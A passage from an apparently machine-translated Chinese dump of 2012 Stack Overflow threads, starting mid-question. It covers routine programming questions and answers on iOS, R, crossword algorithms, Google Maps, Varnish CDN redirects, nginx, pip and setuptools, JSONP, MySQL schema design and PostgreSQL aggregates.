我不明白出了什么问题：响应正确打印到控制台，`UILabel`正确显示文本字符串，如第一个代码块中一样，但是当我尝试使用该响应显示字符串时，我`SIGABRT`在`main`.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:51:33.243

检查`test`变量的数据类型是什么。采用：

```
NSLog(@"data type = %@", [[test class] description]); 
```

是印刷`data type = NSString`吗？如果不是，那就是问题所在。

也试试这个，

```
NSString* test = [ _members valueForKey:@"modelId"];
NSLog(@"Testing response in the console: %@", test);
if ([test isKindOfClass:[NSString class]]) {
  memberLabel.text = test;
} else {
  NSLog(@"test is not a string"); 
} 
```

# r - 如何在 R 中扩展省略号 (...) 参数而不对其进行评估

> ID：13353847
> 
> 赞同：10
> 
> 时间：2012-11-13T00:22:12.627
> 
> 标签：r, lazy-evaluation, ellipsis

我需要一个函数，它接受任意数量的参数并将它们作为表达式存储在一个变量中而不评估它们。我设法做到了，`match.call`但似乎有点“笨拙”。

```
foo <- function(...) {
  expr <- match.call()
  expr[[1]] <- expression
  expr <- eval(expr)
  # do some stuff with expr
  return(expr)
}

> bla
Error: object 'bla' not found
> foo(x=bla, y=2)
expression(x = bla, y = 2) 
```

# 澄清

为了澄清，我在问如何编写一个行为类似于`expression()`. `expression()`由于太长无法解释的原因，我不能直接使用。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-11-13T04:14:17.507

最惯用的方法是：

```
f <- function(x, y, ...) {
  match.call(expand.dots = FALSE)$`...`
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-13T00:33:32.427

使用`.`from`plyr`作为原型

```
foo <-   function (...) 
  {
  as.expression(as.list(match.call()[-1]))
  } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-13T00:46:39.077

最终的预期结果有点模糊（你能澄清一下吗？）。但是，这可能会有所帮助：

```
foo2 <- function(...) {
  expr <- as.list(substitute(list(...)))[-1L]
  class(expr) <- "expression"
  expr
} 
```

例子：

```
foo2(x=bla, y=2)
# expression(x = bla, y = 2) 
```

# algorithm - 帮助填字游戏算法

> ID：13353848
> 
> 赞同：4
> 
> 时间：2012-11-13T00:22:35.867
> 
> 标签：algorithm, crossword

这样的问题是在我的大学里给我的，也许有人会有有趣的算法来解决这个问题。在 stackoverflow 上有几个解决方案，但没有一个是好的（因为它们正在循环所有可能性）。

问题：找到所有可能的组合，将给定的单词分配到给定的表格、网格（矩形，见下面的输入）中。应该没有空闲单元格，单词可以从左到右或从上到下定位。单词不能在一行（列）中逐个单词地定位。

输入：矩形区域，示例：

```
+-----+
|  *  | 
|     |
+-----+ 
```

或者

```
+-----+
|   * |
|     |
|    *|
|   * |
+-----+ 
```

然后输入不同的单词（下一个输入数据）来填充该网格，例如：

```
cdi
zobxzst
tdxic
r
sc
zro
and etc ... 
```

数字最初是未知的，但输入到标准输入结束 - 活动 EOF。

输出：如果存在一种解决方案，则在填充网格中输出该可能的解决方案。如果没有解决方案或解决方案数量，则输出 0 或该确切数字。

例子：

（表格输入）

```
+-----+
|   * |
|     |
|    *|
|   * |
|  * *|
|  *  |
|     |
+-----+ 
```

然后的话`cdi zobxzst tdxic r sc zro rgfvacd oikf df x c r xvf ogish za sh fc hh h bfkh`

（每个作为输入，但这里用空格分隔。）

输出（仅 1 个解决方案）：

```
+-----+
|zro*h|
|ogish|
|bfkh*|
|xvf*r|
|za*c*|
|sc*df|
|tdxic|
+-----+ 
```

重要提示：输入的网格仅限于 16 个（！）单元格，字数少于 60 个。我写了一个算法来搜索所有可能的组合，但它对我不起作用，因为执行时间有限（10我猜是秒）并且这个问题无法用粗略的算法解决（例如，15 个网格上的 15 个和大约 60 个！可能或更多可能的排列，可以在普通 2GHz PC 上处理大约 1 天？）。

也许存在另一个独特的解决方案。也许这个问题比编程更数学化，也许可以使用一些左右组合而不是上下组合？或者也许是加权细胞？

PS 我有 3 周的时间来解决这个问题，如果没有，我可以在 3 周后在这里发布解决方案（好消息）；）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:49:54.800

> 在 stackoverflow 上有几个解决方案，但没有一个是好的（因为它们正在循环所有可能性）。

那么我的想法也可能是错误的：但这是我脑海中的一个想法。

> 我写了一个算法来搜索所有可能的组合

如果有太多，那么问题可能是您也在搜索/循环不可能的组合以及可能的组合。

例如，当你在左上角放置一个像“zro”这样的词时，很少有“可能”的组合可以放在它下面的垂直词中：

1.  第一个垂直单词必须以“z”开头
2.  第二个垂直单词必须以 'r' 开头
3.  第三个垂直单词必须以 'o' 开头
4.  第二行的字母组合（由放置垂直单词产生）本身必须是有效单词
5.  等等

所以：

1.  选择任何单词并将其放在左上角
2.  找到满足上述约束的现有单词
3.  如果你找到一个或多个这样的词，那么继续这样看你是否能解决整个事情；或者如果你失败了，那么用不同的初始词再试一次

概括：

*   不要生成每一个完整的网格，然后测试它是否满足所有约束
*   而是在构建网格时使用约束，以减少您测试的可能性数量

* * *

我建议你从一个初始单词开始解决网格。

代替测试左上角的每个单词，更好的（例如，因为它可以快速消除不可能性）生成起始位置的方法是：

*   查找最长的单词（例如`rgfvacd`）
*   找到交叉/加入它的所有可能的单词组合
*   尝试将这些有效组合中的每一个放在网格上

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T10:48:31.980

我建议你首先应该看看你必须填写的单词长度，在你的例子中：

```
+-----+
|   * |
|     |
|    *|
|   * |
|  * *|
|  *  |
|     |
+-----+ 
```

你有两个 7 字母的单词，三个 1 字母的单词，等等。

您应该根据计数对该列表进行排序，并首先尝试使用计数最低的 wrod 长度，在下一次迭代中，您应该列出您需要查找的单词，例如 - 三个以“a”开头的 4 个字母单词- 你应该计算你的单词列表中剩下多少个单词，然后选择其中单词最少的一个 - 如果它是 0 则返回。

希望这是有道理的。

# jquery - 带有jquery mobile的第二个标记和map.fitBounds（）导致巨大的缩小

> ID：13353852
> 
> 赞同：0
> 
> 时间：2012-11-13T00:22:44.093
> 
> 标签：jquery, jquery-mobile, google-maps-api-3, google-maps-markers

我正在使用 jQuery 1.7 和最新的 jQuery Mobile 以及 Google Maps Places 库。

我在折线上遇到了类似于[这个](https://stackoverflow.com/questions/10030760/jquery-ui-map-fit-bounds-with-a-polyline)问题的问题，除了我没有使用（如果可能的话，宁愿不使用）任何插件。

单击一个页面上的按钮会在同一文档的另一页面上填充地图。

我试图通过使用下面的代码片段尽可能清晰地显示我的所有搜索结果并放大。

```
var bounds = new google.maps.LatLngBounds();
for(var i=0; i<results.length; i++)
{
    var resCoOrds = new google.maps.LatLng(results[i].geometry.location.lat(), results[i].geometry.location.lng());
    var marker = new google.maps.Marker({
        position : resCoOrds, 
        map : myMap, 
        icon: myMarkerIcon
    });

    makerList.push(marker);

    google.maps.event.addListener(marker, 'click', function()
    {
        var resInfoWindow = new google.maps.InfoWindow({content:liContent});
        resInfoWindow.open(map, this);
    });

    bounds.extend(resCoOrds);
    myMap.fitBounds(bounds);
} 
```

我的问题是上面最后一行的结果！

添加第一个标记按预期工作，但是在添加第二个标记时，地图被放大，使我所有的搜索结果一起出现在地图上的一个小点上，迫使用户放大，这不符合我的目的..

这种缩小不会发生在相同的代码时

*   不使用 jQuery 移动！！

*   地图与使用标记填充地图的“搜索”按钮位于同一页面上

非常感谢任何帮助或指示..

提前致谢..

问候，

阿楚

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:45:34.713

您的代码中有（另一个）错字：

```
var resCoOrds = new google.maps.LatLng(results[i].geometry.location.lat(), results[i].geometry.location.lng; 
```

应该：

```
var resCoOrds = new google.maps.LatLng(results[i].geometry.location.lat(), results[i].geometry.location.lng()); 
```

虽然如果您只是使用它会更简单，`results[i].geometry.location`因为它已经是 google.maps.LatLng：

```
var resCoOrds = results[i].geometry.location 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T21:12:10.667

弄清楚了...

这是我的解决方案：我注意到，如果地图已经加载并且在我开始添加标记或调用时在活动页面上可见，则不存在缩放问题`map.fitBounds()`。所以我使用地图的`tilesloaded`事件等到地图准备好，然后添加标记和适合边界。

下面是我使用的代码...

```
function searchCallback(results, status) {
    if (status == google.maps.places.PlacesServiceStatus.OK) 
    {
        if (results.length) 
        {
            $.mobile.changePage("#mapview");
            google.maps.event.addListenerOnce(map, "tilesloaded", function()
            {
                var bounds = new google.maps.LatLngBounds();
                for ( var i = 0; i < results.length; i++) 
                {
                    /* code to add markers */
                    bounds.extend(results[i].geometry.location);
                }
                map.fitBounds(bounds);
            }   
        }
     }
 } 
```

这种方法解决了我的问题，但如果有人有更好的解决方案，请告诉我..

谢谢..

# apache - 使用 Varnish 将图像请求重写为 CDN URL

> ID：13353854
> 
> 赞同：2
> 
> 时间：2012-11-13T00:23:01.173
> 
> 标签：apache, rewrite, cdn, varnish

我有 Varnish (3.0.3) 作为负载平衡器/静态缓存坐在两个 Web 服务器前面。我已经使用 Original Pull 方法设置了 CDN。如果我手动从网站上的图像中获取 URL，放入 CDN 地址，我可以验证原始拉取是否正常工作，并且图像被拉取到 CDN 并提供服务。

我的应用程序相当复杂，我正在测试这个 CDN 以查看它是否显着加快了 Web 应用程序的速度，所以我还不想重写我的任何 php 代码来使用 CDN 图像。

我想做的是将 Varnish 设置为重写接收到的图像文件请求，并通过 CDN 而不是直接从集群中的两个 Apache 服务器中提取它们。

我已经阅读了 Varnish 文档和一些关于如何做类似事情的在线指南，但我无法让它正常工作，需要一些帮助。

以下是我尝试执行此操作的几种不同方法（为简洁起见进行了编辑）：

```
sub vcl_recv {
  #if request is image, redirect to CDN
  if (req.url ~ "\.(gif|ico|jpg|jpeg|png)$") {
        set req.http.host = "cdn.domain.com/";
        error 750 req.http.host + req.url;

    }

 }
sub vcl_error {
  if (obj.status == 750) {
    set obj.status = 302;
    set obj.http.Location = obj.response;
    return(deliver);
  }
} 
```

那没有用。它导致到处都是损坏的图像，并且确实出现的任何东西都使用了 .webp 扩展名，所以它没有被上述条件处理。

所以我尝试了这个：

```
 backend cdn {
         .host = "cdn.domain.com";
         .port = "80";
}
sub vcl_recv {
  #if request is image, redirect to CDN
  if (req.url ~ "\.(gif|ico|jpg|jpeg|png)$") {

      set req.backend = cdn;
      return(lookup);
  } 
```

}

这在页面上显示了一些图像，但是当查看它们的源时，它们看起来来自 Apache 服务器（域名不是 CDN 的域名），并且只有大约一半的图像显示......可能是浏览器缓存。

我想在这里提供一些输入，谢谢大家。

有没有办法使用 Varnish 进行这种重定向？我最好在 Varnish 前面设置 nginx 以重写对 cdn 的请求吗？

**更新**：使用下面给出的两个答案，我有重定向工作和一个 ACL 以允许 CDN 直接提取图像而不是重定向到自身。但是，尽管我验证了 ACL 允许使用我自己的外部 IP 进行连接，但 CDN 并没有从服务器中提取新图像。它会给出 502 错误 (odd<)，而不是将图像从本地服务器拉到 CDN 并提供服务。这就是我的 vcl_recv 块现在的样子：

```
acl cdn {
     "ip.of.CDN";
}

sub vcl_recv {
  #if request is image, redirect to CDN
  if (req.url ~ "\.(gif|ico|jpg|jpeg|png)$") {
        if(!client.ip ~ cdn){
           error 750 "http://cdn.domain.com" + req.url;
        }
    }

 }
sub vcl_error {
  if (obj.status == 750) {
    set obj.status = 302;
    set obj.http.Location = obj.response;
    return(deliver);
  }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-15T08:50:37.990

你绝对可以很容易地用 Varnish 做到这一点——不需要设置 nginx 或任何东西。实际上，您的第一个解决方案非常接近成功。它只需要一些修改。

```
sub vcl_recv {
  #if request is image, redirect to CDN
  if (req.url ~ "\.(gif|ico|jpg|jpeg|png)$") {
        error 750 "http://cdn.domain.com" + req.url;
    }
}
sub vcl_error {
  if (obj.status == 750) {
    set obj.status = 302;
    set obj.http.Location = obj.response;
    return(deliver);
  }
} 
```

您忘记了 CDN URL 中的“http://”，并且您可以省略主机的最后一个斜杠，因为所有`req.url`s 都以 / 开头。

您还需要确保`vcl_error`代码是第一个在`vcl_error()`. 即，如果您有多个定义`vcl_error`，请确保在`if (obj.status == 750)`达到检查之前它们都没有提供任何输出。

请记住，此解决方案会导致所有客户端浏览器首先查询您的服务器，然后在 302 重定向后向 CDN 发出另一个请求。这会显着增加每个图像加载的延迟，并且可能不是确定 CDN 是否可以提高应用程序性能的最佳方法。

**更新：**关于您在尝试从源中提取内容时显示 502 错误的 CDN 问题。依靠远程 IP 地址来确定重定向是非常冒险的，因为 CDN 可以很好地使用多个服务器来进行拉取，并且地址可能会随着时间而改变。这将使 VCL 维护起来非常费力且容易出错。

是否可以设置一个唯一的虚拟主机供 CDN 使用？例如`originpull.domain.com`并设置 CDN 以便从该地址而不是您的主`www.domain.com`地址中提取内容？

然后，您可以修改`vcl_recv()`如下：

```
sub vcl_recv {
  #if request is image and request is not made from CDN, redirect to CDN
  if (req.http.host != "originpull.domain.com" &&
      req.url ~ "\.(gif|ico|jpg|jpeg|png)$") {
        error 750 "http://cdn.domain.com" + req.url;
    }
} 
```

这将确保来自 CDN 的请求永远不会被重定向。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-15T14:09:21.257

假设您有 CDN 从站点中提取图像的副本，并且您没有手动将图像推送到 CDN。您是否错过了从重写或后端代理中排除 CDN 网络的简单内容？由于 CDN 需要能够直接从您的站点提取图像的副本以填充其缓存。

自从我玩 Varnish 以来已经有一段时间了，而且从来都不是专家，但是以下几行可能会起作用：

```
# Defnine the IP ranges of the CDN server.
acl cdn {
        "localhost";
        "11.22.33.0"/24;
}

...

    #if request is image, redirect to CDN, unless from the CDN
    if (req.url ~ "\.(gif|ico|jpg|jpeg|png)$") {
        if (!client.ip ~ cdn) {
            error 750 "http://cdn.domain.com" + req.url;
        }
    }
... 
```

# java - Netbeans GUI 开发大小问题

> ID：13353855
> 
> 赞同：2
> 
> 时间：2012-11-13T00:23:07.980
> 
> 标签：java, swing, user-interface, netbeans

我在 JScrollPane 内使用带有 JPanel 的 CardLayout 时遇到问题。基本上我在 JScrollpane 中有一个主 JFrame 和一个 JPanel，然后是一大堆不同的 JPanel，它们充当“卡片”并在不同的按钮点击时弹出。问题是，有些面板不能一直滚动到 JScrollPane 的底部，它们只能滚动到初始面板的位置。

任何对 NetBeans 有一定经验的人都可以告诉我如何确保每个面板都可以在滚动窗格中完全滚动吗？如果您只知道设置此选项的 java 代码，我也会很感激。

谢谢。

# php - 非标准端口上的 Kohana 3 重定向

> ID：13353866
> 
> 赞同：0
> 
> 时间：2012-11-13T00:23:58.880
> 
> 标签：php, redirect, kohana, kohana-3

我在使用 Kohana3 时遇到问题。

目前正在开发中，我们将端口 444 用于 https。

如果我在开机时重定向

```
https://localhost:444 

$this->request->redirect('/login'); 
```

我会被送到

```
http://localhost 
```

我用谷歌搜索了很多，发现 Kohana3 在重定向方面（非常）有问题，并应用了所有修复程序，但错误仍然不断发生。

另外，我试图破解代码并始终强制使用 https（作为测试），然后问题是我被重定向到

```
https://localhost/login 
```

当我在端口 444 而不是 443 上运行服务器时，它不存在。

所以我几乎没有想法，似乎kohana没有正确检测到协议和端口......

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:50:16.630

您需要`base_url`在`bootstrap.php`. Kohana 不会“检测”任何东西。

# ios - 使用 AFNetworking 下载的 Pdf 文件不是预期的文件大小

> ID：13353868
> 
> 赞同：4
> 
> 时间：2012-11-13T00:24:13.380
> 
> 标签：ios, afnetworking

当我尝试使用 AFNetworking 从 URL 下载 pdf 文件时，保存的文件大小大约是我预期的一半。当我使用 curl/标准浏览器工具发出相同的请求时，文件大小是正确的。

如何即时解压缩文件以使其可读？或者 AFNetworking 是否会自动压缩它不应该压缩的文件？

AFNetworking 的客户端类默认设置以下请求标头：

```
"Accept-Encoding" = gzip;
"Accept" = application/json"; 
```

这是我获取文件的方式：

```
AFHTTPClient *client; // already instantiated & configured
NSURLRequest *request = [client requestWithMethod:@"GET" path:requestPath parameters:parameters];
AFHTTPRequestOperation *operation = [client HTTPRequestOperationWithRequest:request success:success failure:failure];

operation.outputStream = [NSOutputStream outputStreamToFileAtPath:localFilePath append:NO];

[self enqueueHTTPRequestOperation:operation]; 
```

后来，当我通过 NSFileManager 和外部工具检查文件大小时，大小是我期望的 1/2。

当我通过 HTTP 浏览器客户端发出相同的请求时，我在响应标头中看不到任何表明返回的内容已压缩的内容。

服务器发送的响应头（通过 HTTP 浏览器扩展工具检查）：

```
Transfer-Encoding: chunked
Status: 200 OK
Content-Transfer-Encoding: binary
Content-Disposition: inline; filename="document_sample.pdf"
Connection: keep-alive
Content-Type: application/pdf
Cache-Control: private 
```

如何下载文件以便按预期保存？

# python - 使用 setuptools 从位置安装

> ID：13353869
> 
> 赞同：3
> 
> 时间：2012-11-13T00:24:21.307
> 
> 标签：python, setuptools, pypi

我有一个网站框架，我想在多个项目中使用，但我不想将我的框架提交给 PyPi。无论如何我可以告诉我的 setup.py 从特定位置安装框架吗？

这是我当前的 setup.py

```
from setuptools import setup

setup(
    name='Website',
    version='0.2.1',
    install_requires=[
        'boto>=2.6',
        'fabric>=1.4',
        'lepl>=5.1',
        'pygeoip>=0.2.4',
        'pylibmc>=1.2.3',
        'pymongo>=2.2',
        'pyyaml>=3.1',
        'requests>=0.12',
        'slimit>=0.7.4',
        'thrift>=0.8.0',
        'tornado>=2.3',
    ],
) 
```

这些依赖项实际上是我的框架的所有依赖项，所以如果我能以某种方式包含它，我只能在此处列出框架。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T01:40:42.913

看起来您的所有要求都是公开的（在 PyPI 上），并且您不需要它们的特定版本，只需“足够新”即可。在 2016 年，当您可以指望每个人都有最新版本的`pip`. 如果您只是`pip install .`从源目录或`pip install git+https://url/to/package`类似目录中获取，它只会从网络中提取最新版本的依赖项。您的包不在 PyPI 上的事实不会阻止 pip 在那里找到它的依赖项。

或者，如果您想将它们全部存储在本地，您可以设置一个本地 PyPI 索引。尽管在这种情况下，将您的包推送到同一个本地索引并从那里安装它可能会更简单。

如果您需要更复杂的东西，[需求文件](http://pip.readthedocs.org/en/stable/user_guide/#requirements-files)可以为您处理。

特别是，如果您需要将包分发给组织中可能没有设置您团队的本地索引的其他人，或者由于某种原因您一开始就无法设置本地索引，您可以将所有需求文件中的必要信息——或者，如果更合适的话，在用于安装你的包的命令行上（如果你坚持使用`easy_install`或旧版本，它甚至可以工作`pip`）。

文档提供了完整的细节，[这篇博](https://caremad.io/2013/07/setup-vs-requirement/)文很好地解释了它，但简短的版本是这样的：

*   如果您有本地 PyPI 索引，请提供`--extra-index-url=http://my.server/path/to/my/pypi/`.

*   如果你有一个 HTTP 服务器，你可以将包放在上面，并且你可以在你的服务器中启用“自动索引目录内容”选项，只需提供`--find-links=http://my.server/path/to/my/packages/`.

*   如果您想使用本地文件（或 SMB/AFP/等文件共享），请创建一个简单的 HTML 文件，其中只包含指向所有本地包的链接，并提供`--find-links=file:///path/to/my/index.html`.

同样，这些可以在“安装这个包，运行这个”（或`curl | sh`安装脚本）的命令行上，但通常你只想把它们放在一个需求文件中。如果是这样，请确保每个选项仅使用一个值（例如，如果要添加两个额外的索引，请添加两个`--extra-index-url`参数）并将每个值放在自己的行中。

需求文件还允许您指定每个包的特定版本，因此您可以确保人们使用您开发和测试的相同代码进行部署，这在这些情况下通常很有用。

# ajax - 我在跨域 ajax 调用中遇到 json 解析错误，不知道如何解决这个问题

> ID：13353871
> 
> 赞同：0
> 
> 时间：2012-11-13T00:24:43.123
> 
> 标签：ajax, jquery, cross-domain, jsonp

电话看起来像这样

```
$.ajax({
  url: url,
  crossDomain: true,
  dataType: 'jsonp',
  success: function(){console.log('success');}
}) 
```

从服务器代码它是这样的

```
string data = callback + "(" jsonData + ")";
send("application/javascript",data); 
```

jsonData 是有效的，我很确定。我已经在许多在线 json 验证器上对其进行了测试。我还尝试在服务器代码中将内容类型从 application/javascript 切换到 application/json ，但没有区别。

我让它工作的唯一方法是覆盖发送给我的 jquery 的回调函数，并让它调用我自己的全局函数，而不是调用 jquery 成功函数。这是该解决方法的代码

```
$.ajax({
   url: url,
   crossDomain: true,
   dataType: "jsonp",
   jsonpCallback: "onMyDataReceived"       
 })

  function onMyDataReceived(jsonData){  doStuff(jsonData ); } 
```

但我觉得这更像是一种 hack，而不是让它自然地从 $.ajax.sucess 函数中流出。关于为什么第一个代码片段会出错的任何帮助？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:50:47.833

我真的不确定为什么第一个片段不起作用，但尝试以下

```
$.getJSON(url+"&callback=?",function(data){ console.log(data);}) 
```

在我的情况下工作。

# nginx - 在 nginx 中配置子目录应用程序

> ID：13353873
> 
> 赞同：-1
> 
> 时间：2012-11-13T00:25:01.933
> 
> 标签：nginx

有人可以帮我配置我的 nginx 在哪里：

/app -> 是本地的html页面

/ -> 是没有app文件夹的https服务器

以下conf对我不起作用：（

```
server {
    listen              80;
    ssl_verify_client   off;
    server_name         localhost;
    location / {
        proxy_pass_header Server;
        proxy_set_header  Host $http_host;
        proxy_set_header  X-Real-IP $remote_addr;
        proxy_set_header  X-Scheme $scheme;
        proxy_pass        https://xx.xx.xx.xx/;
    }
    location /app {
      root "c:\LOCAL_PATH\app";
      index  index.html;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T06:58:15.370

将您的 -block 换成`location /`以下应该这样做：

```
location / { rewrite ^ https://$host$request_uri?; } 
```

# ios - Detail ViewController 的框架（在 UISplitViewController 中）在自动旋转时不会改变它的框架？

> ID：13353878
> 
> 赞同：0
> 
> 时间：2012-11-13T00:25:25.177
> 
> 标签：ios, ipad, autoresize

我有一段时间想弄清楚为什么在我的 Detail ViewController 中，即使在横向模式下，它的框架仍然是 1024x768？

我已经启用了通常的嫌疑人——我支持所有方向，调整子视图的大小被选中......我已经尝试了灵活的自动调整大小蒙版，我能想到的一切。

我以纵向记录 Detail VC 框架的坐标，它的高度为：1024，宽度为 768。

这永远不会改变，这让我感到困惑。

这里没有做任何特别的事情。这种调整大小应该自动发生吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-10T07:03:51.557

我怀疑这可能与我在[此答案](https://stackoverflow.com/questions/13367022/catransition-not-respecting-orientation-changes-on-ipad)中概述的原因相同。

但我认为您指的是您的 splitViewController 的视图：

```
self.splitViewController.view 
```

这是最外面的视图，它的框架没有改变。

至于你的详细视图控制器的视图

```
[[self.splitViewController.viewControllers objectAtIndex:1] view] 
```

它的框架*确实*发生了变化。

如果您肯定指的是您的详细视图控制器，那么您应该忽略这个答案......

# mysql - 关系表概念：请检查我的理解

> ID：13353879
> 
> 赞同：1
> 
> 时间：2012-11-13T00:25:35.443
> 
> 标签：mysql, database, database-design

我正在设计我的第一个大型数据库并想检查我是否可以提供表关系。

我正在设计一个网络应用程序

1.  `users``games`可以玩`teams`
2.  每个`game`都有它的`categories`
3.  `users``team`为他们创建`game`并选择他们的`team` `category`
4.  每个`game`都有自己的`categories`启用子集
5.  事实上`categories`，从游戏到游戏略有不同。例如，在*game1*和*game2中有**慢动作*类别，但它们在允许的时间上有所不同。

 **我希望如何存储这个：

1.  有表`users`, `teams`, `games`, `categories`, 每个都有足够的数据字段和`INT primary_key`s
2.  有`user`——MN`team`关系表
3.  有`game`- `category`MN 关系表，带有允许的时间列
4.  表中有`category_id`和`game_id`外键`team`列

我的常见问题：

1.  用户 -> 所有他/她的团队，其中他们是游戏，类别
2.  游戏->所有类别
3.  游戏 -> 所有参与的团队，有类别，有用户
4.  游戏 -> 所有用户参与
5.  团队->这是游戏，类别

我对我的建议：

1.  `category`在关系表中创建一个真正的类别 id 创建一个单独的 INT 主索引`game`并在团队表中使用它
2.  使用 team_id category_id game_id 创建单独的表，并将它们设置为连接的主索引
3.  只需`game_id`在`teams`表中设置为 INDEX

问题是这件事是否可以接受，有什么建议可以接受？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T18:17:20.037

一些想法：

*   用于`UNSIGNED INT`主键而不是`INT`.
*   你必须有一些 TEAM -> GAME 映射，对吧？

鉴于此，您似乎可以轻松处理“常见查询”。

你的“建议”试图解决什么问题？**

# iphone - ABPeoplePickerNavigationController“组”视图导航控制器

> ID：13353881
> 
> 赞同：3
> 
> 时间：2012-11-13T00:25:58.687
> 
> 标签：iphone, ios, uinavigationbar, abpeoplepickerview

我在我的应用程序中使用自定义导航栏外观，并在 App Delegate 的`application:didFinishLaunchingWithOptions:`方法中使用此代码：

```
[[UINavigationBar appearance] setBackgroundImage:[UIImage imageNamed:@"navBar.png"] forBarMetrics:UIBarMetricsDefault];
[[UINavigationBar appearance] setBackgroundColor:[UIColor clearColor]]; 
```

但是，当我呈现一个（以允许选择联系人以填充新电子邮件的收件人：字段）时，此外观会中断，因为由于系统设置的属性，在显示此视图时`ABPeoplePickerNavigationController`系统会使用额外的高度（“选择要邮寄的联系人”）。`UINavigationBar``prompt``UINavigationItem`

解决方法是添加以下代码：

```
[[UINavigationBar appearanceWhenContainedIn:[ABPeoplePickerNavigationController class], nil] setBackgroundImage:nil forBarMetrics:UIBarMetricsDefault];
[[UINavigationBar appearanceWhenContainedIn:[ABPeoplePickerNavigationController class], nil] setBarStyle:UIBarStyleBlack]; 
```

看起来像这样：

![修复了联系人列表的视图](../Images/339fdeb53ffb398b231dc9cbd687c3cc.png)

但是，当您从初始视图中点击“**组**”按钮时，这个小技巧不起作用。由于超高的导航栏，它看起来仍然破碎：

![点击组按钮后超高导航栏的破损视图](../Images/840521d31e1a415ab503326657c008a6.png)

任何想法该视图的控制器名称是什么（因此我可以应用与上述相同的排除），或解决此问题的另一种方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T16:42:37.697

我现在才打这个..运气好不好解决？我正在考虑尝试通过 ABPeoplepickerNavigationControllers 视图控制器进行交互并应用外观WhenContainedIn 方法...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-11T21:28:54.393

我也一直在与此作斗争，但认为我已经拼凑出一个解决方案。

组选择视图是其他一些（我不知道，可能是私有的）类，因此我们不能像您为 ABPeoplePickerNavigationController 所做的那样，通过外观代理时包含的方法指定异常样式。相反，我们应该尝试解决最初的问题，即在显示提示并且导航栏很高时自定义背景图像无法正确呈现。

此处的解决方案（[显示提示时出现 iOS5 UINavigationBar 背景图像问题](https://stackoverflow.com/questions/11350976/ios5-uinavigationbar-background-image-issues-when-prompt-is-shown)）建议为导航栏使用可调整大小的背景图像。

这几乎对我有用，但是我使用的背景图像包括导航栏下方的阴影，并且在显示提示时没有正确调整大小。相反，我必须使用没有阴影的可调整大小的背景图像，然后单独指定阴影图像。

```
UINavigationBar* navigationBar = [UINavigationBar appearance];
[navigationBar setBackgroundImage:[[UIImage imageNamed:@"TopBarBackgroundNoShadow"] resizableImageWithCapInsets:UIEdgeInsetsMake(3, 0, 3, 0)]
                forBarMetrics:UIBarMetricsDefault];
[navigationBar setShadowImage:[UIImage imageNamed:@"TopBarShadowResize"]]; 
```

使用这种方法消除了对任何异常样式的需求，并且在 ABPeoplePickerNavigationController 和组选择视图中以及在标准高度下看起来都很好。

# java - eclipse中的maven在哪里？

> ID：13353882
> 
> 赞同：2
> 
> 时间：2012-11-13T00:26:00.147
> 
> 标签：java, eclipse, maven

我有带有 M2E 插件的 Eclipse Juno。我使用 eclim，我想从终端构建我的应用程序。我找不到将其添加到路径的 Maven 可执行文件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:32:36.273

它不在任何地方。M2E 嵌入了 Maven，它不安装它。您需要自己安装它。

# objective-c - 将 UI Image 和 UI Label 保存到一个变量中以便稍后恢复

> ID：13353884
> 
> 赞同：0
> 
> 时间：2012-11-13T00:26:06.160
> 
> 标签：objective-c, ios, uiimageview, uilabel

我需要将 UIImageViews 中的图片保存到某个变量中，以便稍后将它们带回来。图像也有相应的标签，编号为 1-6。

我有一个随机播放图像的按钮。但是，当一个人完成他们的回合时，我希望保存这些图像，这样当下一个人的回合结束时（它会做同样的保存事情），原来的人会看到他们完成回合时看到的图像。我希望标签也这样做。

我不太确定我会怎么做。我很想只有两组不同的 UIimageViews，这样我就可以在转弯结束后将一组“隐藏”并取消隐藏另一组。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:31:44.927

您保留相同的图像，但将图像名称保存为 NSString 以供以后使用。然后您可以将新图像加载到其中：

_yourImageView.image = [UIImage imageNamed:_yourSavedImageName];

# yahoo - 如何排除所有带有链接的内容出现在管道输出中？

> ID：13353890
> 
> 赞同：1
> 
> 时间：2012-11-13T00:26:28.263
> 
> 标签：yahoo, yahoo-pipes

雅虎管道对我来说是新的，我想知道如何排除带有链接的推文出现在管道输出中。我知道过滤器可以使用关键字（比如大学）排除所有内容，但我不知道如何排除链接。

我尝试了过滤 item.description ，其中包含 [每一行都有 bit.ly, goo.gl] 基本上用 URL 缩短器阻止了所有内容。有没有办法有效地阻止所有链接而不必枚举所有链接？

任何帮助将不胜感激。谢谢

# sql - PostgreSQL 计算每组的最高位置和其他统计信息

> ID：13353893
> 
> 赞同：0
> 
> 时间：2012-11-13T00:27:11.137
> 
> 标签：sql, postgresql

我有一个具有以下结构的表

```
|user_id | place | type_of_place | money_earned| time |
|--------+-------+---------------+-------------+------|
|        |       |               |             |      | 
```

该表非常大，有几百万行。数据位于 PostgreSQL 9.1 数据库中。

我想根据 user_id 和 type_of_place 计算：平均值、标准差和前 5 个位置（按计数排序），以及最常用的时间（模式）。

结果数据必须采用以下形式：

```
| user_id | type_of_place | avg | stddev |   top5_places    | mode |
+---------+---------------+-----+--------+------------------+------+
|     1   |      tp1      | 10  |   1    | {p1,p2,p3,p4,p5} |   8  |
|     2   |      tp1      |  3  |   2    | {p3,p4}          |   23 |
